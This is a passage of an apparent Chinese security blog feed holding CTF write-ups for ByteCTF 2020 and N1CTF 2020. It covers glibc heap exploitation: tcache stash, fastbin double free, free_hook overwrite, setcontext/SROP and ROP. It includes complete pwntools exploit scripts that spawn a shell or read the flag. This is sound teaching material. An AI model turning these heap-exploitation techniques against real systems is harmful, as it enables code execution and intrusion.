class="hljs-keyword">break</span>;            &#125;            tcache_put(tc_victim, tc_idx);<span class="hljs-comment">//放入tcache中</span>          &#125;        &#125;<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>        <span class="hljs-keyword">void</span> *p = chunk2mem(victim);        alloc_perturb(p, bytes);        <span class="hljs-keyword">return</span> p;      &#125;    &#125;  &#125;</code></pre></div><p>也就是比如当一个线程申请0x50大小的chunk时，如果tcache没有，那么就会进入分配区进行处理，如果对应bin中存在0x50的chunk，除了取出并返回之外，ptmalloc会认为这个线程在将来还需要相同的大小的chunk，因此就会把对应bin中0x50的chunk尽可能的放入tcache的对应链表中去。</p><h4 id="fastbin-double-free遇上Tcache-Stash"><a href="#fastbin-double-free遇上Tcache-Stash" class="headerlink" title="fastbin double free遇上Tcache Stash"></a>fastbin double free遇上Tcache Stash</h4><p>假设有个double free可以触发，其用到fastbin上：<br>进行free 多次构成：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/G59EQi.png" srcset="/img/loading.gif" alt></p><p>为了触发stash，先申请完tcache里的chunk，让其为空，（或者让其不满也可以）</p><p>然后再申请一下同size的chunk，就会触发stash。也是其精妙之处，在glibc2.27以下，往往是这样的构造：<br><img src="http://qiqianyun.chumen77.xyz/uPic/S4rab1.png" srcset="/img/loading.gif" alt></p><p>主要由于fastbin 取出时，其会检查size是否相符合，导致很受限制。此时其基本就是可以攻击带有0x7f,去攻击libc上的内存。</p><p>但是有了stash这个机制，其就变成了以下的情况：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/68p4Vb.png" srcset="/img/loading.gif" alt></p><p>由于上来申请同size的chunk时触发了stash机制，其会把fastbin里剩下的chunk放入到tcache中。由于chunk 7的fd是可以控制的，写入tag地址，然后放入chain的chunk ，也就是chunk 8 7 tag 。这就相当于劫持了tcache chain，可以实现任意地址写。</p><h4 id="libc2-31-下的-setcontext利用"><a href="#libc2-31-下的-setcontext利用" class="headerlink" title="libc2.31 下的 setcontext利用"></a>libc2.31 下的 setcontext利用</h4><p>在libc2.31下 setcontext函数变成了用rdx来控制对应参数，导致原来的攻击办法失效。</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">0x7fa30df8f0d6</span> &lt;setcontext+<span class="hljs-number">54</span>&gt;:      <span class="hljs-keyword">ldmxcsr</span> <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x1c0</span>]   <span class="hljs-number">0x7fa30df8f0dd</span> &lt;setcontext+<span class="hljs-number">61</span>&gt;:      <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsp</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0xa0</span>]   <span class="hljs-number">0x7fa30df8f0e4</span> &lt;setcontext+<span class="hljs-number">68</span>&gt;:      <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rbx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x80</span>]   <span class="hljs-number">0x7fa30df8f0eb</span> &lt;setcontext+<span class="hljs-number">75</span>&gt;:      <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rbp</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x78</span>]   <span class="hljs-number">0x7fa30df8f0ef</span> &lt;setcontext+<span class="hljs-number">79</span>&gt;:      <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r12</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x48</span>]   <span class="hljs-number">0x7fa30df8f0f3</span> &lt;setcontext+<span class="hljs-number">83</span>&gt;:      <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r13</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x50</span>]   <span class="hljs-number">0x7fa30df8f0f7</span> &lt;setcontext+<span class="hljs-number">87</span>&gt;:      <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r14</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x58</span>]   <span class="hljs-number">0x7fa30df8f0fb</span> &lt;setcontext+<span class="hljs-number">91</span>&gt;:      <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r15</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x60</span>]   <span class="hljs-number">0x7fa30df8f0ff</span> &lt;setcontext+<span class="hljs-number">95</span>&gt;:      <span class="hljs-keyword">test</span>   <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> <span class="hljs-built_in">fs</span>:<span class="hljs-number">0x48</span>,<span class="hljs-number">0x2</span>   <span class="hljs-number">0x7fa30df8f10b</span> &lt;setcontext+<span class="hljs-number">107</span>&gt;:     <span class="hljs-keyword">je</span>     <span class="hljs-number">0x7fa30df8f1c6</span> &lt;setcontext+<span class="hljs-number">294</span>&gt;</code></pre></div><p>跳转到：</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">0x7fa30df8f1c6</span> &lt;setcontext+<span class="hljs-number">294</span>&gt;:     <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rcx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0xa8</span>]   <span class="hljs-number">0x7fa30df8f1cd</span> &lt;setcontext+<span class="hljs-number">301</span>&gt;:     <span class="hljs-keyword">push</span>   <span class="hljs-built_in">rcx</span>   <span class="hljs-number">0x7fa30df8f1ce</span> &lt;setcontext+<span class="hljs-number">302</span>&gt;:     <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x70</span>]   <span class="hljs-number">0x7fa30df8f1d2</span> &lt;setcontext+<span class="hljs-number">306</span>&gt;:     <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x68</span>]   <span class="hljs-number">0x7fa30df8f1d6</span> &lt;setcontext+<span class="hljs-number">310</span>&gt;:     <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rcx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x98</span>]   <span class="hljs-number">0x7fa30df8f1dd</span> &lt;setcontext+<span class="hljs-number">317</span>&gt;:     <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r8</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x28</span>]   <span class="hljs-number">0x7fa30df8f1e1</span> &lt;setcontext+<span class="hljs-number">321</span>&gt;:     <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r9</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x30</span>]   <span class="hljs-number">0x7fa30df8f1e5</span> &lt;setcontext+<span class="hljs-number">325</span>&gt;:     <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x88</span>]   <span class="hljs-number">0x7fa30df8f1ec</span> &lt;setcontext+<span class="hljs-number">332</span>&gt;:     <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">eax</span>   <span class="hljs-number">0x7fa30df8f1ee</span> &lt;setcontext+<span class="hljs-number">334</span>&gt;:     <span class="hljs-keyword">ret</span>       <span class="hljs-number">0x7fa30df8f1ef</span> &lt;setcontext+<span class="hljs-number">335</span>&gt;:     <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rcx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rip</span>+<span class="hljs-number">0x192c7a</span>]        # <span class="hljs-number">0x7fa30e121e70</span>   <span class="hljs-number">0x7fa30df8f1f6</span> &lt;setcontext+<span class="hljs-number">342</span>&gt;:     <span class="hljs-keyword">neg</span>    <span class="hljs-built_in">eax</span>   <span class="hljs-number">0x7fa30df8f1f8</span> &lt;setcontext+<span class="hljs-number">344</span>&gt;:     <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> <span class="hljs-built_in">fs</span>:[<span class="hljs-built_in">rcx</span>],<span class="hljs-built_in">eax</span>   <span class="hljs-number">0x7fa30df8f1fb</span> &lt;setcontext+<span class="hljs-number">347</span>&gt;:     <span class="hljs-keyword">or</span>     <span class="hljs-built_in">rax</span>,<span class="hljs-number">0xffffffffffffffff</span>   <span class="hljs-number">0x7fa30df8f1ff</span> &lt;setcontext+<span class="hljs-number">351</span>&gt;:     <span class="hljs-keyword">ret</span></code></pre></div><p>可以看到其还是可以正常的控制所有寄存器的，但是其改为了rdx来控制偏移获取数据，这就导致2.27以下的free 一个 存放 好srop frame 的chunk方法失效。</p><h5 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h5><p>在libc中有一条magic gadget：</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">0x7f896b381930</span>       <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x8</span>]<span class="hljs-number">0x7f896b381934</span>      <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rsp</span>],<span class="hljs-built_in">rax</span><span class="hljs-number">0x7f896b381938</span>       <span class="hljs-keyword">call</span>   <span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x20</span>]</code></pre></div><p>其正好可以通过rdi来控制rdx,然后call 对应偏移的函数。</p><p>通常在free 一个 chunk的时候，其rdi 就是这个heap 的地址，当然这个heap的内容也是可以被控制的，则rdx也可以被控制。可以把rdx就还控制为这个heap的地址，然后在heap + 0x20的地方，填好setcontext + 61 地址，这样就可以调用了。</p><p>并且实现的效果还是跟原来一样，利用pwntools的<code>frame = SigreturnFrame()</code>，进行构造所需控制的寄存器。但是在发送frame时，由于刚刚必须的<code>5 * 8</code>的字节占用，所以要发的是<code>frame[40:]</code> 。这样其在设置寄存器，对应偏移找数据时不会出错。</p><h3 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>泄漏libc 和 heap </li><li>fastbin double free 并触发tcache stash，获得一个任意地址写</li><li>打free hook，填上magic  gadget</li><li>free 一块 控制好 内容的chunk，调用 setcontext 读一段orw的rop ，并跳上去</li></ul><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python">#!/usr/bin/env pythonfrom pwn import *import timelocal_file  = './gun'elf = ELF(local_file)context.log_level = 'debug'debug = 1if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote('node3.buuoj.cn',27411)    libc = elf.libc    #libc = ELF('.')context.arch = elf.archcontext.terminal = ['tmux','neww']#,''splitw','-h's      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, '\0'))uu64    = lambda data               :u64(data.ljust(8, '\0'))info_addr = lambda tag, addr        :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript='b main')    gdb.attach(io)    pause()def add(size,data):    sla('&gt;','3')    sla('ice',str(size))    sa('ame',str(data))def load(idx):    sla('&gt;','2')    sla('?',str(idx))def free(idx):    sla('&gt;','1')    sla('time',str(idx))sla('name','chumen77')add(0x500,'chumen77' + '\n')add(0x100,'chumen77' + '\n')load(0)free(1)add(0x100,'\n')load(0)free(1)ru('he ')libcbase = uu64(r(6)) -0x1ec010for i in range(10):    add(0x30,'\n')for i in range(10):    load(10-i)info_addr('libcbase',libcbase)free(10)for i in range(10):    add(0x30,'\n')for i in range(8):    load(7-i)free(7)load(8)free(1)load(10)free(4)r()ru('The ')ru('The ')ru('The ')ru('The ')heapbase = uu64(r(6)) - 0x650info_addr('heapbase',heapbase)for i in range(7):    add(0x30,'\n')magic_gg = 0x154930 + libcbaseadd(0x30,p64(0x1eeb28+libcbase) + '\n')add(0x30,'./flag'  + '\n')add(0x30,p64(0x1eeb28+libcbase) + '\n')add(0x30,p64(magic_gg) + '\n')'0x7f896b381930       mov    rdx,QWORD PTR [rdi+0x8]0x7f896b381934      mov    QWORD PTR [rsp],rax0x7f896b381938       call   QWORD PTR [rdx+0x20]'frame = SigreturnFrame()frame.rax = 0frame.rdi = 0frame.rsi = 0x1eeb28 + libcbase + 0x50frame.rdx = 0x1000frame.rip = libc.search(asm("syscall \nret")).next() + libcbaseframe.rsp = 0x1eeb28 + libcbase + 0x50payload = p64(0) + p64(heapbase + 0x6a0) + p64(0)*2 + p64(libc.sym['setcontext']+61+libcbase) + str(frame)[5*8:]add(0x130, payload + '\n')load(12)free(1)pop_rdi = 0x0000000000026b72 + libcbasepop_rsi = 0x0000000000027529 + libcbasepop_rdx_pop_r12 = 0x000000000011c371 + libcbaseopen = libcbase + libc.symbols["open"]read = libcbase + libc.symbols["read"]puts = libcbase + libc.symbols['puts']rop=flat([pop_rdi,heapbase + 0x620,pop_rsi,0,open,pop_rdi,3,pop_rsi,heapbase + 0x2a0,pop_rdx_pop_r12,0x30,0,read,pop_rdi,heapbase + 0x2a0,puts])sleep(0.1)# debug()s(rop)itr()</code></pre></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Bytectf2020部分wp&quot;&gt;&lt;a href=&quot;#Bytectf2020部分wp&quot; class=&quot;headerlink&quot; title=&quot;Bytectf2020部分wp&quot;&gt;&lt;/a&gt;Bytectf2020部分wp&lt;/h1&gt;&lt;h2 id=&quot;easyheap&quot;&gt;&lt;a 
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="wp" scheme="http://chumen77.xyz/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>N1CTF2020部分wp</title>
    <link href="http://chumen77.xyz/2020/10/19/N1CTF2020%E9%83%A8%E5%88%86wp/"/>
    <id>http://chumen77.xyz/2020/10/19/N1CTF2020部分wp/</id>
    <published>2020-10-19T09:18:47.650Z</published>
    <updated>2020-11-13T06:09:26.688Z</updated>
    
    <content type="html"><![CDATA[<h1 id="N1CTF2020部分wp"><a href="#N1CTF2020部分wp" class="headerlink" title="N1CTF2020部分wp"></a>N1CTF2020部分wp</h1><h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><p>调试one gadget 花了近4小时。。😭</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>c++写的程序，存在add show del的功能，但是进入各自的函数看，看的是稀里糊涂的。个人发现的只是其按照自己的逻辑对内存块idx 1，2进行处理。</p><p>因为功能很简单，可以直接上手调试，来确定程序是如何运作的。</p><p>上手调试后会发现，其根据3个指针来对idx 1、2 处理。</p><h4 id="动调分析"><a href="#动调分析" class="headerlink" title="动调分析"></a>动调分析</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'ber'</span>,str(data))</code></pre></div><div class="hljs"><pre><code class="hljs python">add(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)</code></pre></div><p>看下bss段0x2032a0的数据：</p><div class="hljs"><pre><code class="hljs python">pwndbg&gt;  x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x0002032A0</span> +<span class="hljs-number">0x555555554000</span><span class="hljs-number">0x5555557572a0</span>: <span class="hljs-number">0x0000555555769e70</span>      <span class="hljs-number">0x0000555555769e78</span><span class="hljs-number">0x5555557572b0</span>: <span class="hljs-number">0x0000555555769e78</span>      <span class="hljs-number">0x0000000000000000</span></code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/O7QsvP.png" srcset="/img/loading.gif" alt></p><div class="hljs"><pre><code class="hljs python">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x555555769e60</span><span class="hljs-number">0x555555769e60</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000021</span><span class="hljs-number">0x555555769e70</span>: <span class="hljs-number">0x0000000000000001</span>      <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x555555769e80</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x000000000000f181</span></code></pre></div><p>再次：</p><div class="hljs"><pre><code class="hljs python">add(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)</code></pre></div><p>看下bss段0x2032a0的数据：</p><div class="hljs"><pre><code class="hljs python">pwndbg&gt;  x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x0002032A0</span> +<span class="hljs-number">0x555555554000</span><span class="hljs-number">0x5555557572a0</span>: <span class="hljs-number">0x0000555555769e90</span>      <span class="hljs-number">0x0000555555769ea0</span><span class="hljs-number">0x5555557572b0</span>: <span class="hljs-number">0x0000555555769ea0</span>      <span class="hljs-number">0x0000000000000000</span></code></pre></div><div class="hljs"><pre><code class="hljs python">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x555555769e60</span><span class="hljs-number">0x555555769e60</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000021</span><span class="hljs-number">0x555555769e70</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x555555769e80</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000021</span><span class="hljs-number">0x555555769e90</span>: <span class="hljs-number">0x0000000000000001</span>      <span class="hljs-number">0x0000000000000002</span><span class="hljs-number">0x555555769ea0</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x000000000000f161</span></code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/t6qFSC.png" srcset="/img/loading.gif" alt></p><p>可以这样接着测试free 和 del的功能。</p><h4 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h4><p>重点就是bss段储存内存块 1 2 信息的3个指针。</p><h5 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h5><ul><li><p>指针1和3是一个边界指针，指针2是数据编辑指针。根据指针2处来写number数据，一次是8个字节，写完后，指针2会加8。</p></li><li><p>当指针2大小超过指针3，其就会申请一块新的内存，其申请完内存大小是以<code>0x20,0x20,0x30,0x50,0x90,0x110,0x210,0x410,0x810,0x1010</code> 这样递增。</p></li><li><p>申请完新内存，会把指针1对应的内存块进行free，也就是上一块chunk。并把上一块内存中的number值进行拷贝到新申请的内存中。并且会根据申请到的chunk地址，进行对bss段3个指针的更新。</p><h5 id="free函数"><a href="#free函数" class="headerlink" title="free函数"></a>free函数</h5></li><li><p>让指针2减8.</p><h5 id="show-函数"><a href="#show-函数" class="headerlink" title="show 函数"></a>show 函数</h5></li><li><p>打印出指针2减8后对应地址上的数据信息</p></li></ul><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><h4 id="idx-内存块1"><a href="#idx-内存块1" class="headerlink" title="idx 内存块1"></a>idx 内存块1</h4><ul><li><p>add到有0x1010 chunk块，其原来的0x810会放进unsortbin</p></li><li><p>free 多次，让指针2 指向0x810的fd或者bk处，利用show泄漏出libc地址</p></li><li><p>free 多次，让指针2指向0x20的fd处，进行tcache attack，修改其为free hook</p><h4 id="idx-内存块2"><a href="#idx-内存块2" class="headerlink" title="idx 内存块2"></a>idx 内存块2</h4></li><li><p>add数据，准备上free hook，上free hook 改free hook为one gadget</p></li><li><p>紧接着程序，就free 上一个chunk，就会触发free hook</p></li></ul><p>但是写完exp，会发现one gadget没有一个可以打通的，栈上存在很多数据，无法满足。尽管使用realloc进行栈帧调整，也没法子。</p><p>此时看一下寄存器上的信息，发现刚通过free hook跳转过去后，上面的rdi rsi什么的都指向了可控的heap段，那就修改思路，修改free hook 为system，<strong>并且提前修改其rdi指向heap段的数据，修改为<code>sh\x00</code></strong> 。这样再触发free hook就可以<code>system(sh)</code>了。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/WPo0kI.png" srcset="/img/loading.gif" alt></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./signin'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'47.242.161.199'</span>,<span class="hljs-number">9990</span>)    libc = elf.libc    <span class="hljs-comment"># libc = ELF('./libc.so')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]roc = [<span class="hljs-number">0</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0x8</span>,<span class="hljs-number">0x9</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'ber'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">258</span>):    add(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">458</span>+<span class="hljs-number">57</span>):    free(<span class="hljs-number">1</span>)show(<span class="hljs-number">1</span>)r()libc_base = int(r(<span class="hljs-number">15</span>),<span class="hljs-number">10</span>) - <span class="hljs-number">0x3ebca0</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">270</span>):    free(<span class="hljs-number">1</span>)info_addr(<span class="hljs-string">'libcbase'</span>,libc_base)free_hook = <span class="hljs-number">0x3ed8e8</span> + libc_baseadd(<span class="hljs-number">1</span>,<span class="hljs-number">33</span>)add(<span class="hljs-number">1</span>,free_hook<span class="hljs-number">-8</span>)system = libc.sym[<span class="hljs-string">'system'</span>] +libc_baseadd(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>)add(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>)free(<span class="hljs-number">2</span>)free(<span class="hljs-number">2</span>)add(<span class="hljs-number">2</span>,<span class="hljs-number">26739</span>)add(<span class="hljs-number">2</span>,system)add(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>)itr()</code></pre></div><h2 id="oflo"><a href="#oflo" class="headerlink" title="oflo"></a>oflo</h2><p>存在花指令，无法正常反编译，直接可以用ida或者gdb进行跟即可。但是不能直接打开，会被反调试ptrace检测到，可以attach上去即可。<strong>（注意是root权限下。）</strong></p><p>开始程序让输入19个字符，关键代码在<code>0x400a69</code>,但是坏的机器码，gdb 下watch一下，发现有流程在根据你<strong>输入的东西</strong>处理这一块的机器码，输入正确了可以执行下去。在关键代码处，可以发现其是在处理14位的数据，但是刚开始输入的是19个，多出来的5个不知道什么用。调试会发现，其就根据前5个字节，对<code>0x400a69</code>块进行处理，一共处理了10次。可以猜到就是<code>n1ctf</code>。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/IBvReP.png" srcset="/img/loading.gif" alt></p><p>这块处理完其汇编代码，就正常了。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">13</span>; ++i ) &#123;   <span class="hljs-keyword">if</span> ( *(&amp;v4 + i) != ((*(<span class="hljs-keyword">char</span> *)(i + a1) + <span class="hljs-number">2</span>) ^ *(<span class="hljs-keyword">char</span> *)(i + a2)) )</code></pre></div><p>进入以后可以看到关键代码。其是在于起初程序，<code>cat /proc/version</code>到的字符串取前14个在进行xor。要是绕过这里，没有相应字符串，就会出现问题。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python">key = [<span class="hljs-number">0x35</span>,<span class="hljs-number">0x2D</span>,<span class="hljs-number">0x11</span>, <span class="hljs-number">0x1A</span>,<span class="hljs-number">0x49</span>,<span class="hljs-number">0x7D</span>,<span class="hljs-number">0x11</span>, <span class="hljs-number">0x14</span>,<span class="hljs-number">0x2B</span>,<span class="hljs-number">0x3B</span>,<span class="hljs-number">0x3E</span>,<span class="hljs-number">0x3D</span>,<span class="hljs-number">0x3C</span>,<span class="hljs-number">0x5F</span>]data = [<span class="hljs-number">0x4C</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x20</span>]flag = <span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(key)):    flag += chr(key[i] ^ (data[i]+<span class="hljs-number">2</span>))print(flag)</code></pre></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;N1CTF2020部分wp&quot;&gt;&lt;a href=&quot;#N1CTF2020部分wp&quot; class=&quot;headerlink&quot; title=&quot;N1CTF2020部分wp&quot;&gt;&lt;/a&gt;N1CTF2020部分wp&lt;/h1&gt;&lt;h2 id=&quot;signin&quot;&gt;&lt;a href=&quot;#sig
      
    
    </summary>
    
    
      <category term="re" scheme="http://chumen77.xyz/tags/re/"/>
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="heap" scheme="http://chumen77.xyz/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>House of Spirit</title>
    <link href="http://chumen77.xyz/2020/10/09/House%20of%20Spirit/"/>
    <id>http://chumen77.xyz/2020/10/09/House of Spirit/</id>
